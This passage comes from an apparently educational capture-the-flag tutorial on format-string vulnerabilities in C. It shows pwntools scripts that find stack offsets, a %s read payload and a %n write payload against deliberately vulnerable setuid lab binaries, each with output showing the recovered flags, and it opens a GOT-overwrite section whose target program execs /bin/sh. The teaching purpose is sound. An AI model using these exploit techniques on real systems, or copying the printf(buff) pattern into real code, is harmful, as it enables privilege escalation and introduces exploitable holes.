</span></span><span style="display:flex;"><span>    ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>             ‚Üì
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    printf<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;%7</span>$s<span style="color:#e6db74">&#34;</span><span style="color:#f92672">)</span> dereferences arg <span style="color:#ae81ff">7</span> ‚Üí 0x404080 ‚Üí <span style="color:#e6db74">&#34;flag{...}&#34;</span>
</span></span></code></pre></div><p>Lets write python script for this. In above diagram we only took a guess that it might be in 7th argument or position but in reality we don&rsquo;t know where is it. So we need to find where it is.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>from pwn import *
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context.log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;error&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i in range<span style="color:#f92672">(</span>1,50<span style="color:#f92672">)</span>:
</span></span><span style="display:flex;"><span>    io <span style="color:#f92672">=</span> process<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;./fmt_read&#39;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> f<span style="color:#e6db74">&#39;%{i}$p&#39;</span>
</span></span><span style="display:flex;"><span>    io.sendline<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;Pa$$w0rd_1s_0n_Th3_St4ck&#39;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> f<span style="color:#e6db74">&#39;AAAAAAAA%{i}$p&#39;</span>
</span></span><span style="display:flex;"><span>    io.sendline<span style="color:#f92672">(</span>payload<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    print<span style="color:#f92672">(</span>io.recvall<span style="color:#f92672">()</span>, i<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    io.close<span style="color:#f92672">()</span>
</span></span></code></pre></div><p>By putting a recognizable pattern like <code>AAAAAAAA</code> (which is <code>0x4141414141414141</code> in hex) and is of 8 bytes, we can easily spot where our input lands on the stack.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ python3 main.py
</span></span><span style="display:flex;"><span>/home/at0m/main.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
</span></span><span style="display:flex;"><span>  io.sendline<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;Pa$$w0rd_1s_0n_Th3_St4ck&#39;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>/home/at0m/main.py:12: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
</span></span><span style="display:flex;"><span>  io.sendline<span style="color:#f92672">(</span>payload<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - What you are looking for is here - 0x404080\nEnter String - AAAAAAAA0xa&#39;</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - What you are looking for is here - 0x404080\nEnter String - AAAAAAAA(nil)&#39;</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>&lt;SNIP&gt;
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - What you are looking for is here - 0x404080\nEnter String - AAAAAAAA0x4141414141414141&#39;</span> <span style="color:#ae81ff">16</span>
</span></span><span style="display:flex;"><span>&lt;SNIP&gt;
</span></span></code></pre></div><p>That last line shows that when we printed the 16th stack argument (<code>%16$p</code>), we got <code>0x41414141414141</code> which is just hex of our <code>AAAAAAAA</code>. Now we know that our input goes at 16 argument or position in stack so we can add our format string payload there to point to 17th position which will be our memory address that is pointing to flag.</p>
<p>After this we can just write normal exploit.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;error&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./fmt_read&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;Pa$$w0rd_1s_0n_Th3_St4ck&#39;</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;%17$sAAA&#39;</span> <span style="color:#f92672">+</span> pack(<span style="color:#ae81ff">0x404080</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p>Okay in above it might be little confusing. So let&rsquo;s explain first this <code>%17$sAAA</code>.</p>
<table>
  <thead>
      <tr>
          <th>Part</th>
          <th>Meaning</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><code>%17$s</code></td>
          <td>Print the string at the 17th stack value which has address that pointing to flag.</td>
      </tr>
      <tr>
          <td><code>AAA</code></td>
          <td>Padding to align things properly (3 bytes; avoids misalignment so total it can be 8 bytes)</td>
      </tr>
      <tr>
          <td><code>pack(0x404080)</code></td>
          <td>The <strong>actual memory address of the flag</strong>, encoded in little endian</td>
      </tr>
  </tbody>
</table>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>   Stack Frame <span style="color:#f92672">(</span>printf call<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span> ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
</span></span><span style="display:flex;"><span> ‚îÇ arg <span style="color:#ae81ff">17</span> ‚Üí 0x404080            ‚îÇ  ‚Üê points to flag
</span></span><span style="display:flex;"><span> ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
</span></span><span style="display:flex;"><span> ‚îÇ format string: <span style="color:#e6db74">&#34;%17</span>$s<span style="color:#e6db74">&#34;</span>       ‚îÇ
</span></span><span style="display:flex;"><span> ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ python3 main.py
</span></span><span style="display:flex;"><span>/home/at0m/main.py:8: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
</span></span><span style="display:flex;"><span>  io.sendline<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;Pa$$w0rd_1s_0n_Th3_St4ck&#39;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Enter Password - What you are looking <span style="color:#66d9ef">for</span> is here - 0x404080
</span></span><span style="display:flex;"><span>Enter String - flag<span style="color:#f92672">{</span>Y0U_4R3_F43T<span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>AAA<span style="color:#ae81ff">\x</span>80@@$ 
</span></span></code></pre></div><p>We got our flag.</p>
<h2 id="0x10---arbitrary-write-using-format-string-vulnerability">0x10 - Arbitrary Write Using Format String Vulnerability</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> target;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> buff[<span style="color:#ae81ff">30</span>];
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Enter String - &#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%30s&#34;</span>,<span style="color:#f92672">&amp;</span>buff);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;You Entered - &#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(buff);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Value Of Target Is - %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,target);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (target <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span>) {
</span></span><span style="display:flex;"><span>		FILE <span style="color:#f92672">*</span>f <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;flag.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span>(f <span style="color:#f92672">==</span> NULL){
</span></span><span style="display:flex;"><span>        		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;flag file not found</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>        		<span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		    <span style="color:#66d9ef">char</span> filename[<span style="color:#ae81ff">100</span>], c;
</span></span><span style="display:flex;"><span>		    c <span style="color:#f92672">=</span> <span style="color:#a6e22e">fgetc</span>(f);
</span></span><span style="display:flex;"><span>    		    <span style="color:#66d9ef">while</span> (c <span style="color:#f92672">!=</span> EOF) {
</span></span><span style="display:flex;"><span>        	    <span style="color:#a6e22e">printf</span> (<span style="color:#e6db74">&#34;%c&#34;</span>, c);
</span></span><span style="display:flex;"><span>	            c <span style="color:#f92672">=</span> <span style="color:#a6e22e">fgetc</span>(f); }
</span></span><span style="display:flex;"><span>   		    <span style="color:#a6e22e">fclose</span>(f);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}	
</span></span></code></pre></div><p><code>gcc fmt_write.c -o fmt_write -no-pie</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ls -la fmt_write flag.txt
</span></span><span style="display:flex;"><span>-rw------- <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">30</span> Jun <span style="color:#ae81ff">26</span> 17:03 flag.txt
</span></span><span style="display:flex;"><span>-rwsr-sr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">17088</span> Jun <span style="color:#ae81ff">26</span> 17:03 fmt_write
</span></span></code></pre></div><p>Same as previous we want to use <code>fmt_read</code> to read <code>flag.txt</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~ at0m ‚ùØ checksec --file<span style="color:#f92672">=</span>fmt_read
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/at0m/fmt_read&#39;</span>
</span></span><span style="display:flex;"><span>    Arch:       amd64-64-little
</span></span><span style="display:flex;"><span>    RELRO:      Partial RELRO
</span></span><span style="display:flex;"><span>    Stack:      Canary found
</span></span><span style="display:flex;"><span>    NX:         NX enabled
</span></span><span style="display:flex;"><span>    PIE:        No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    SHSTK:      Enabled
</span></span><span style="display:flex;"><span>    IBT:        Enabled
</span></span><span style="display:flex;"><span>    Stripped:   No
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>~ at0m ‚ùØ ./fmt_write 
</span></span><span style="display:flex;"><span>Enter String - AAAAAAAA        
</span></span><span style="display:flex;"><span>You Entered - AAAAAAAA
</span></span><span style="display:flex;"><span>Value Of Target Is - <span style="color:#ae81ff">0</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; info functions
</span></span><span style="display:flex;"><span>All defined functions:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Non-debugging symbols:
</span></span><span style="display:flex;"><span>0x0000000000401000  _init
</span></span><span style="display:flex;"><span>0x00000000004010c0  putchar@plt
</span></span><span style="display:flex;"><span>0x00000000004010d0  puts@plt
</span></span><span style="display:flex;"><span>0x00000000004010e0  fclose@plt
</span></span><span style="display:flex;"><span>0x00000000004010f0  __stack_chk_fail@plt
</span></span><span style="display:flex;"><span>0x0000000000401100  printf@plt
</span></span><span style="display:flex;"><span>0x0000000000401110  fgetc@plt
</span></span><span style="display:flex;"><span>0x0000000000401120  fopen@plt
</span></span><span style="display:flex;"><span>0x0000000000401130  __isoc99_scanf@plt
</span></span><span style="display:flex;"><span>0x0000000000401140  exit@plt
</span></span><span style="display:flex;"><span>0x0000000000401150  _start
</span></span><span style="display:flex;"><span>0x0000000000401180  _dl_relocate_static_pie
</span></span><span style="display:flex;"><span>0x0000000000401190  deregister_tm_clones
</span></span><span style="display:flex;"><span>0x00000000004011c0  register_tm_clones
</span></span><span style="display:flex;"><span>0x0000000000401200  __do_global_dtors_aux
</span></span><span style="display:flex;"><span>0x0000000000401230  frame_dummy
</span></span><span style="display:flex;"><span>0x0000000000401236  main
</span></span><span style="display:flex;"><span>0x0000000000401350  __libc_csu_init
</span></span><span style="display:flex;"><span>0x00000000004013c0  __libc_csu_fini
</span></span><span style="display:flex;"><span>0x00000000004013c8  _fini
</span></span></code></pre></div><p><img src="/img/fs_write.png" alt="fs_write.png"></p>
<p>We see long assembly code most important is this part:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>0x00000000004012b5 &lt;+127&gt;:	mov    eax,DWORD PTR <span style="color:#f92672">[</span>rip+0x2db9<span style="color:#f92672">]</span>        <span style="color:#75715e"># </span>
</span></span><span style="display:flex;"><span>0x404074 &lt;target&gt;
</span></span><span style="display:flex;"><span>   0x00000000004012bb &lt;+133&gt;:	cmp    eax,0x3
</span></span><span style="display:flex;"><span>   0x00000000004012be &lt;+136&gt;:	jne    0x401331 &lt;main+251&gt;
</span></span></code></pre></div><p>It loads the value of the <code>target</code> variable which address is <code>0x404074</code>  into <code>eax</code> and then compares it to <code>3</code>.</p>
<p>If <code>target != 3</code>, it jumps to another location in the program. Otherwise, it continues normally and you can see its using <code>fopen</code> function later on possibly meaning opening <code>flag.txt</code> file.</p>
<p>So In this challenge we will need to use write format string vulnerability to write <code>3</code> into target variable. This time we will use <code>%n</code> format specifier.</p>
<p>Like before we need to find our position of our input in stack with same as before python script:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;error&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">50</span>):
</span></span><span style="display:flex;"><span>    io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./fmt_write&#39;</span>)
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;AAAAAAAA%</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">$p&#39;</span>
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>    print(io<span style="color:#f92672">.</span>recvall(),i)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>close()
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ python3 main.py
</span></span><span style="display:flex;"><span>/home/at0m/main.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
</span></span><span style="display:flex;"><span>  io.sendline<span style="color:#f92672">(</span>payload<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>&lt;SNIP&gt;
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter String - You Entered - AAAAAAAA0x4141414141414141\nValue Of Target Is - 0\n&#39;</span> <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>&lt;SNIP&gt;
</span></span></code></pre></div><p>This time offset or position is in <code>8</code>. Read in <code>0xE</code> section how <code>%n</code> works first.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>from pwn import *
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context.binary <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./fmt_write&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> process<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;./fmt_write&#39;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> b<span style="color:#e6db74">&#39;ABC%9$nD&#39;</span> + pack<span style="color:#f92672">(</span>0x404074<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>io.sendline<span style="color:#f92672">(</span>payload<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>io.interactive<span style="color:#f92672">()</span>
</span></span></code></pre></div><p>This makes <code>printf</code> write the number of printed characters so far (3 from <code>'ABC'</code>) into the address <code>0x404074</code> (the <code>target</code> variable), using <code>%9$n</code>, where the 9th argument on the stack is the packed address. We added <code>D</code> at end to make it <code>8</code> bytes as it is good practice.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">‚ùØ</span> python3 main<span style="color:#f92672">.</span>py
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] <span style="color:#e6db74">&#39;/home/at0m/fmt_write&#39;</span>
</span></span><span style="display:flex;"><span>    Arch:       amd64<span style="color:#f92672">-</span><span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>little
</span></span><span style="display:flex;"><span>    RELRO:      Partial RELRO
</span></span><span style="display:flex;"><span>    Stack:      Canary found
</span></span><span style="display:flex;"><span>    NX:         NX enabled
</span></span><span style="display:flex;"><span>    PIE:        No PIE (<span style="color:#ae81ff">0x400000</span>)
</span></span><span style="display:flex;"><span>    SHSTK:      Enabled
</span></span><span style="display:flex;"><span>    IBT:        Enabled
</span></span><span style="display:flex;"><span>    Stripped:   No
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] Starting local process <span style="color:#e6db74">&#39;./fmt_write&#39;</span>: pid <span style="color:#ae81ff">7202</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] Switching to interactive mode
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] Process <span style="color:#e6db74">&#39;./fmt_write&#39;</span> stopped <span style="color:#66d9ef">with</span> exit code <span style="color:#ae81ff">0</span> (pid <span style="color:#ae81ff">7202</span>)
</span></span><span style="display:flex;"><span>Enter String <span style="color:#f92672">-</span> You Entered <span style="color:#f92672">-</span> ABCDt<span style="color:#f92672">@@</span>
</span></span><span style="display:flex;"><span>Value Of Target Is <span style="color:#f92672">-</span> <span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>FLAG{Wr1t3_Wh3r3_Y0u_W4nt_t0}
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] Got EOF <span style="color:#66d9ef">while</span> reading <span style="color:#f92672">in</span> interactive
</span></span></code></pre></div><p>We got the flag.</p>
<h2 id="0x11---got-overwrite-using-format-string-vulnerability">0x11 - GOT Overwrite Using Format String Vulnerability</h2>
<p>This technique can spawn us shell also.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">win</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\033</span><span style="color:#e6db74">[1;31m[+] PWNED!!!</span><span style="color:#ae81ff">\033</span><span style="color:#e6db74">[0m&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">execl</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, <span style="color:#e6db74">&#34;sh&#34;</span>, <span style="color:#e6db74">&#34;-c&#34;</span>, <span style="color:#e6db74">&#34;/bin/sh&#34;</span>, (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> buff[<span style="color:#ae81ff">50</span>];
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Enter String - &#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%50s&#34;</span>,<span style="color:#f92672">&amp;</span>buff);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(buff);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>gcc fmt_got.c -o fmt_got -no-pie</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ls -la fmt_got           
</span></span><span style="display:flex;"><span>-rwsr-sr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">16864</span> Jun <span style="color:#ae81ff">26</span> 17:03 fmt_got
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>‚ùØ checksec --file<span style="color:#f92672">=</span>fmt_got 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/at0m/fmt_got&#39;</span>
</span></span><span style="display:flex;"><span>    Arch:       amd64-64-little
</span></span><span style="display:flex;"><span>    RELRO:      Partial RELRO
</span></span><span style="display:flex;"><span>    Stack:      No canary found
</span></span><span style="display:flex;"><span>    NX:         NX enabled
</span></span><span style="display:flex;"><span>    PIE:        No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    SHSTK:      Enabled
</span></span><span style="display:flex;"><span>    IBT:        Enabled
</span></span><span style="display:flex;"><span>    Stripped:   No
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>‚ùØ ./fmt_got              
</span></span><span style="display:flex;"><span>Enter String - AAAAAAAAAA
</span></span><span style="display:flex;"><span>AAAAAAAAAA
</span></span></code></pre></div><p>We need to exploit program and spawn us a shell. We can see that it has canary disabled it means we can do buffer overflow but we are not going to use that technique here.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; info functions
</span></span><span style="display:flex;"><span>All defined functions:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Non-debugging symbols:
</span></span><span style="display:flex;"><span>0x0000000000401000  _init
</span></span><span style="display:flex;"><span>0x0000000000401080  puts@plt
</span></span><span style="display:flex;"><span>0x0000000000401090  printf@plt
</span></span><span style="display:flex;"><span>0x00000000004010a0  __isoc99_scanf@plt
</span></span><span style="display:flex;"><span>0x00000000004010b0  exit@plt
</span></span><span style="display:flex;"><span>0x00000000004010c0  execl@plt
</span></span><span style="display:flex;"><span>0x00000000004010d0  _start
</span></span><span style="display:flex;"><span>0x0000000000401100  _dl_relocate_static_pie
</span></span><span style="display:flex;"><span>0x0000000000401110  deregister_tm_clones
</span></span><span style="display:flex;"><span>0x0000000000401140  register_tm_clones
</span></span><span style="display:flex;"><span>0x0000000000401180  __do_global_dtors_aux
</span></span><span style="display:flex;"><span>0x00000000004011b0  frame_dummy
</span></span><span style="display:flex;"><span>0x00000000004011b6  win
</span></span><span style="display:flex;"><span>0x00000000004011f9  main
</span></span><span style="display:flex;"><span>0x0000000000401260  __libc_csu_init
</span></span><span style="display:flex;"><span>0x00000000004012d0  __libc_csu_fini
</span></span><span style="display:flex;"><span>0x00000000004012d8  _fini
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; disass win
</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> win:
</span></span><span style="display:flex;"><span>   0x00000000004011b6 &lt;+0&gt;:	endbr64
</span></span><span style="display:flex;"><span>   0x00000000004011ba &lt;+4&gt;:	push   rbp
